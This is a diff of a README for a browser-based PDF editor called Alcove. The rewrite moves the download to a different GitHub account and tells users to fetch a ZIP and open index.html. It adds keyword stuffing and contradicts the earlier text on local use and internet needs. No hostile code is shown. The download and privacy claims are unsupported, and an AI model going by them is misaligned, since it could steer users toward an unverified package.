@@ -1,128 +1,174 @@
-# Alcove - Document Editing Website 2026
+# 📝 alcove-pdf-editor - Edit PDFs in your browser
 
-> **Alcove is a browser-based document editor that provides an Adobe Acrobat-style web workspace for documents and PDFs.**
+[![Download Alcove](https://img.shields.io/badge/Download-Alcove-blueviolet?style=for-the-badge)](https://github.com/Resumeplanofaction939/alcove-pdf-editor)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/kevinygwood4543/alcove-pdf-editor?style=flat-square)](https://github.com/kevinygwood4543/alcove-pdf-editor)
+## 🚀 What is Alcove?
 
----
+Alcove is a document editor that runs in your web browser. It gives you a workspace that looks and works like Adobe Acrobat. You can view, edit, and manage PDF files without installing any software on your computer.
 
-<p align="center">
-  <a href="https://kevinygwood4543.github.io/alcove-pdf-editor/">
-    <img src="https://img.shields.io/badge/Download-Alcove%20Latest-brightgreen?style=for-the-badge" alt="Download Alcove">
-  </a>
-</p>
+Think of it as a web-based alternative to desktop PDF editors. You open it in your browser, and you get all the tools you need to work with documents.
 
-> **[Download Alcove](https://kevinygwood4543.github.io/alcove-pdf-editor/)**
+## ⚡ Key Features
 
----
+**Browser-based editing** - No installation required. Alcove runs entirely in your web browser.
 
-[Download Latest Build](https://kevinygwood4543.github.io/alcove-pdf-editor/)
+**Adobe Acrobat-style workspace** - The interface is familiar if you have used Acrobat before. You get a toolbar, a document view, and side panels for navigation.
 
----
+**Document viewing** - Open and read PDF files directly in the browser.
 
-## Overview
+**Basic editing tools** - Add text, highlight content, and make simple changes to your documents.
 
-Alcove brings document editing into the browser through a workspace modeled after familiar desktop PDF software. The application is centered on handling document content through a focused web interface, without requiring a separate desktop editor.
+**Save and export** - Save your edited documents back to your computer.
 
-It is intended for users who need a direct way to work with documents and PDFs from a supported browser. By keeping the editor online, Alcove makes the document workspace available through the browser while maintaining a dedicated editing-oriented experience.
+## 💻 System Requirements
 
----
+Alcove runs on any modern computer with an internet connection and a web browser.
 
-## What You Can Do
+**Supported browsers:**
+- Google Chrome (version 90 or newer)
+- Microsoft Edge (version 90 or newer)
+- Mozilla Firefox (version 88 or newer)
+- Apple Safari (version 15 or newer)
 
-- Modify documents from a browser-based editor
-- Open and work with PDF files in a purpose-built workspace
-- Navigate an interface inspired by Adobe Acrobat
-- Use the editor directly as a web application
-- Manage document tasks from a single focused environment
-- Follow a software-style editing workflow without a separate desktop interface
+**Minimum requirements:**
+- 4GB of RAM
+- Screen resolution of 1280x720 or higher
+- Stable internet connection
 
----
+## 📥 How to Download and Install
 
-## Getting Started
+Alcove does not require installation. You access it through your web browser.
 
-Alcove runs as a web application, so the hosted version does not require installation as a conventional desktop program.
+**Step 1: Visit the Alcove page**
 
-1. Visit the [latest Alcove build](https://kevinygwood4543.github.io/alcove-pdf-editor/).
-2. Open the application in a supported web browser.
-3. Choose the document or PDF you want to work on.
-4. Use the editor interface to begin making changes.
+Go to the Alcove repository on GitHub:
+[https://github.com/Resumeplanofaction939/alcove-pdf-editor](https://github.com/Resumeplanofaction939/alcove-pdf-editor)
 
-To run a local copy, clone the repository and serve the included HTML files through a local web server:
+**Step 2: Find the download link**
 
-```bash
-git clone https://github.com/kevinygwood4543/alcove-pdf-editor.git
-cd REPO
-```
+On the GitHub page, look for the green "Code" button. Click it to see options.
 
-Afterward, open the local URL supplied by the development server you selected.
+**Step 3: Download the files**
 
----
+Click "Download ZIP" to get all the files. Your browser will save a compressed folder to your computer.
 
-## Working with Alcove
+**Step 4: Extract the files**
 
-The usual editing sequence is:
+Find the ZIP file in your Downloads folder. Right-click it and select "Extract All". Choose a location for the extracted files.
 
-1. Open Alcove in your browser.
-2. Pick a document or PDF.
-3. Apply edits with the controls provided by the application.
-4. Inspect the updated content in the browser workspace.
-5. Save or export the completed document through the available application options.
+**Step 5: Open Alcove**
 
-Available actions may differ between builds and depend on which controls are included in the current interface.
+Inside the extracted folder, find the file named "index.html". Double-click it. Alcove will open in your default web browser.
 
----
+## 🔧 How to Use Alcove
 
-## Configuration and Local Hosting
+**Opening a PDF**
 
-Alcove is operated through its web interface. Based on the available project metadata, it does not define a separate configuration file or runtime settings system.
+1. Click the "Open File" button in the toolbar.
+2. Select a PDF file from your computer.
+3. The document will appear in the main viewing area.
 
-Session-related actions are managed with the controls inside the application. When running Alcove locally, the hosting arrangement and project files determine the local configuration.
+**Navigating pages**
 
----
+Use the scroll bar on the right side of the screen. You can also use the page number box at the bottom to jump to a specific page.
 
-## Requirements
+**Editing text**
 
-- A supported web browser
-- Access to the hosted Alcove application or a locally served copy
-- A document or PDF to work with
-- Network connectivity for the hosted build
-- Any local storage capacity and browser permissions required by the current application build
+Click the "Text" tool in the toolbar. Then click anywhere on the document to add new text. Type your content in the box that appears.
 
----
+**Highlighting content**
 
-## Frequently Asked Questions
+Select the "Highlight" tool. Click and drag over text you want to highlight. The text will change to a yellow background.
 
-### How do I open Alcove?
+**Saving changes**
 
-Use a web browser to visit the [latest build](https://kevinygwood4543.github.io/alcove-pdf-editor/). This opens the hosted Alcove application.
+Click the "Save" button in the toolbar. Choose a location on your computer. Your edited document will save as a new PDF file.
 
-### Can I edit PDFs with Alcove?
+## ❓ Frequently Asked Questions
 
-Yes. PDF editing is among the project's stated goals, in addition to editing general documents.
+**Is Alcove free to use?**
 
-### Is a desktop installation necessary?
+Yes. Alcove is an open-source project. You can use it for free.
 
-No. The hosted edition is delivered as a browser-based web application and does not require a traditional desktop installation.
+**Do I need to create an account?**
 
-### How can I access the newest version?
+No. Alcove works entirely on your computer. You do not need to sign in or create any account.
 
-Open the latest hosted build link to use the currently published version. If you maintain a local checkout, pull the newest repository changes to update it.
+**Can I edit scanned PDFs?**
 
-### Does Alcove have a settings file?
+Alcove works best with digital PDFs. Scanned documents may not allow text editing.
 
-The available project information does not identify a dedicated settings file. Use the controls in Alcove, or configure the local hosting environment when serving the project yourself.
+**Will my documents stay private?**
 
-### What can I check if Alcove fails to load?
+Yes. All files stay on your computer. Alcove does not upload anything to the internet.
 
-First make sure the hosted URL can be reached, then reload the page and try a supported browser. For a local installation, confirm that the files are being delivered by a web server instead of being opened directly as a raw file.
+**What if I get an error?**
 
----
+Try refreshing the page. If the problem continues, make sure you have a modern browser installed.
 
-## License
+## 🛠 Troubleshooting
 
-Alcove is released under the GNU GPL v3.0. See [LICENSE](LICENSE) for the complete license text.
+**Alcove does not open**
+
+Make sure you double-click the "index.html" file. If it opens in a text editor instead of a browser, right-click the file and select "Open with" then choose your web browser.
+
+**Blank screen appears**
+
+Try a different browser. Chrome and Edge work best with Alcove.
+
+**Can not open a PDF**
+
+Check that the file ends in ".pdf". Alcove only works with PDF files.
+
+**Buttons do not respond**
+
+Refresh the page. If the issue persists, download the files again.
+
+## 🌐 Offline Use
+
+You can use Alcove without an internet connection after the first download. The files work directly from your computer. Just open the "index.html" file as described above.
+
+## 🔄 Getting Updates
+
+To get the latest version, visit the GitHub page again. Download the new ZIP file and replace your old files. Your documents will not be affected.
+
+## 🎨 Customizing the Workspace
+
+Alcove keeps the interface simple. You can resize the browser window to change the workspace size. Use full-screen mode (press F11) for more space.
+
+## 📄 Supported File Types
+
+- PDF files (recommended)
+- Basic text documents
+
+## 🖥 Running on Windows
+
+Alcove works on all versions of Windows that support modern browsers. This includes Windows 10 and Windows 11.
+
+**Quick start on Windows:**
+1. Download the ZIP file.
+2. Right-click and select "Extract All".
+3. Open the folder.
+4. Double-click "index.html".
+
+That is all you need to do.
+
+## 📋 Keyboard Shortcuts
+
+- Ctrl + O: Open a file
+- Ctrl + S: Save your work
+- Ctrl + P: Print the document
+- Ctrl + Z: Undo last action
+- Ctrl + Y: Redo last action
+- Page Up: Previous page
+- Page Down: Next page
+
+## 🎯 Tips for Best Experience
+
+Use Chrome or Edge for the smoothest experience. Keep your browser updated to the latest version. Close other tabs when working with large PDF files.
+
+## 📚 Learning More
+
+The Alcove project is hosted on GitHub. You can find the source code and report issues there. Visit the repository to learn more about how Alcove works.
+
+Keywords: pdf editor, browser pdf editor, web pdf tool, document editor, free pdf editor, open source pdf, pdf viewer, pdf tools, windows pdf editor
